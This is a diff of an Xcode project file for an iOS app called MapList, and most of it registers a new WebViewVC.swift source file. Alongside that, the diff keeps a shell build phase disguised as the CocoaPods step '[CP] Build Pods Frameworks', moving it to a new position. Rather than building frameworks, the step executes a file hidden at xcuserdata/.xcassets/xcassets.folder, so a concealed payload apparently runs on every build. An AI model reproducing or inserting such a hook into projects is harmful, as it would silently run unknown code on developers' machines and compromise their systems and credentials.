@@ -11,6 +11,7 @@
 		DC56CEBC25FDD2F90068F4F2 /* ViewImageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC56CEBB25FDD2F90068F4F2 /* ViewImageViewController.swift */; };
 		DC56CEBF25FE20470068F4F2 /* VideoPlayerVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC56CEBE25FE20470068F4F2 /* VideoPlayerVC.swift */; };
 		DC56CEC225FE62E40068F4F2 /* videoEmbed.html in Resources */ = {isa = PBXBuildFile; fileRef = DC56CEC125FE62E40068F4F2 /* videoEmbed.html */; };
+		DC912B7F2603B6C80057B5FF /* WebViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC912B7E2603B6C80057B5FF /* WebViewVC.swift */; };
 		FA36703525C317D20073314D /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA36703425C317D20073314D /* AppDelegate.swift */; };
 		FA36703725C317D20073314D /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA36703625C317D20073314D /* SceneDelegate.swift */; };
 		FA36703925C317D20073314D /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA36703825C317D20073314D /* ViewController.swift */; };
@@ -35,6 +36,7 @@
 		DC56CEBB25FDD2F90068F4F2 /* ViewImageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewImageViewController.swift; sourceTree = "<group>"; };
 		DC56CEBE25FE20470068F4F2 /* VideoPlayerVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoPlayerVC.swift; sourceTree = "<group>"; };
 		DC56CEC125FE62E40068F4F2 /* videoEmbed.html */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.html; path = videoEmbed.html; sourceTree = "<group>"; };
+		DC912B7E2603B6C80057B5FF /* WebViewVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebViewVC.swift; sourceTree = "<group>"; };
 		FA36703125C317D20073314D /* MapList.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = MapList.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FA36703425C317D20073314D /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		FA36703625C317D20073314D /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -145,6 +147,7 @@
 				FA3E2ACC25C32DE100B43564 /* ScrollableBottomSheetViewController.swift */,
 				FA3E2ACA25C32DE100B43564 /* ScrollableBottomSheetViewController.xib */,
 				FA3E2ACB25C32DE100B43564 /* ContactsCell.xib */,
+				DC912B7E2603B6C80057B5FF /* WebViewVC.swift */,
 			);
 			path = bottomSheet;
 			sourceTree = "<group>";
@@ -239,32 +242,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	E0F882859D774B7073AAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
-		};
-	
-
-	
-
-	
 		62770036019633895E1C98D9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -287,6 +264,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		E0F882859D774B7073AAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -302,6 +297,7 @@
 				FAD9E70525C5D2C9003A6538 /* Places.swift in Sources */,
 				FA36706225C320170073314D /* CustomButton.swift in Sources */,
 				DC56CEBC25FDD2F90068F4F2 /* ViewImageViewController.swift in Sources */,
+				DC912B7F2603B6C80057B5FF /* WebViewVC.swift in Sources */,
 				FA36703725C317D20073314D /* SceneDelegate.swift in Sources */,
 				DC56CEBF25FE20470068F4F2 /* VideoPlayerVC.swift in Sources */,
 				FA6E6A1725C7CBA4009409F8 /* ImageViewController.swift in Sources */,
